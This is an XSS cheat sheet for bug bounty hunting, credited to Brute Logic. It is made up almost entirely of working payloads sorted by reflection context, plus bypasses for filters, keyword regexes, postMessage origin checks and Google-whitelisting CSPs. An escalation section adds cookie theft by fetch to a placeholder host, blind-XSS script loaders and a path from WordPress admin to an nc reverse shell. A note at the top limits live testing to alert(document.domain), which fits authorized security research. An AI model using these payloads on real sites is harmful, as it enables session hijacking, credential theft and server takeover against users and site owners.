# Cheatsheet — XSS Decision Rules (Brute Logic)

> Live-program ceiling: `alert(document.domain)` proves the bug — victim delivery, session/token capture, and blind-exfil receivers are report narrative unless explicitly authorized (`sources.md`).

## Context → Payload (first-pass)

| Reflection lands in | Use |
|---|---|
| Tag body / attr value (normal tags) | `<svg onload=alert(1)>` / `"><svg onload=alert(1)>` |
| Inside title/style/script/textarea/noscript/pre/xmp/iframe | `</tag><svg onload=alert(1)>` |
| Attr value, no `>` possible | `"onmouseover=alert(1)//` or `"autofocus/onfocus=alert(1)//` |
| href/src/data/action/formaction | `javascript:alert(1)` / `data:text/html,<svg onload=alert(1)>` |
| JS string literal | `'-alert(1)-'` / `'-alert(1)//` |
| JS string, quotes escaped | `\'-alert(1)//` |
| JS string inside function/if | `'}alert(1);{'` / `'}alert(1)%0A{'` / `\'}alert(1);{//` |
| Anywhere in script block | `</script><svg onload=alert(1)>` |
| Response header | CRLF: `%0D%0ALocation:…Content-Type:text/html%0D%0A%0D%0A<payload>` |
| DOM write (not source) | `<img src=1 onerror=alert(1)>` |
| XML page | `<x:script xmlns:x="http://www.w3.org/1999/xhtml">alert(1)</x:script>` |
| AngularJS page | `{{constructor.constructor('alert(1)')()}}` (probe `{{32*32}}`→1024) |
| URL path in form action (PHP) | `/xss.php/"><svg onload=alert(1)>?` |
| message listener, no origin check | `<iframe src=T onload="frames[0].postMessage('P','*')">` |

## Blocked → Bypass

| Blocked/Filtered | Switch to |
|---|---|
| case-sensitive match | `<Svg OnLoad=` mixed case |
| force-uppercased | `<SVG ONLOAD=&#97&#108&#101&#114&#116(1)>` |
| `<`+`>` pair check | `<svg onload=alert(1)//` (needs native `>` later) |
| `<script>` literal | `<script/x>`, `<svg>`, `data:` src, srcdoc, xlink:href |
| second decode pass | `%253C…` double-encode |
| parentheses | `` alert`1` `` / `setInterval`alert\x28…\x29` `` / `&lpar;1&rpar;` / `&#40;1&#41;` |
| alphabetic chars | `[]['\146\151\154…']['\143\157\156…']('\141\154…')()` |
| `alert` keyword regex | `(alert)(1)`, `a=alert,a(1)`, `[1].find(alert)`, `top["al"+"ert"](1)`, `top[/al/.source+/ert/.source](1)`, `al\u0065rt(1)`, `top[8680439..toString(30)](1)` |
| all tag names | `<x on*>` agnostic: `<x contenteditable onfocus=alert(1)>focus this!` |
| event handlers | `<script src=data:,alert(1)>`, `<form action=javascript:…>`, `srcdoc`, `xlink:href` |
| space | `%09 %0A %0C %0D / +` between positions |
| `//` comments | `<!--` or `%0A-->` |
| strip `<…>` | `o<x>nmouseover=alert<x>(1)//` |
| direct vectors (stored) | `&lt;svg/onload&equals;alert(1)&gt;` (2nd order) |
| origin check (postMessage) | `allowed.com.attacker.tld` subdomain trick / Crosspwn |
| CSP whitelists Google | `script src=google.com/complete/search?client=chrome&jsonp=alert(1);` or AngularJS ng-csp |
| MIME check on upload | `GIF89a=//<script>alert(1)//</script>;` as .gif/.js |
| server sees payload | move to `#fragment`: `eval(location.hash.slice(1)) #alert(1)` |

## Impact escalation defaults

- PoC → `alert(document.domain)` beats `alert(1)` (proves context)
- Cookies → `fetch('//h/?c='+document.cookie)` (skip if httpOnly — grab DOM/storage/CSRF instead)
- Blind → `<script src=//h/mailer.js>` + PHP mail collector
- Big payload → `with(document)body.appendChild(createElement('script')).src='//h/2.js'`
- WordPress admin → plugin-editor nonce theft → `nc` reverse shell
- Very short slot → `<base href=//h>` + native relative script

## Tells & smells

- Reflection in `value="…"` with no `>` in page → inline handler path only
- Input reflected multiple times → fragment-chain opportunity, check each context's quoting
- `addEventListener('message')` in JS → grep for `origin` check; absent = postMessage XSS if frameable
- CSP lists `*.google.com`/`googleapis.com` → JSONP/AngularJS bypass exists
- Upload reflects filename/metadata → stored-XSS candidate via `"><svg onload=…>` name or `exiftool -Artist`
- `X-Frame-Options` missing → iframe vectors viable
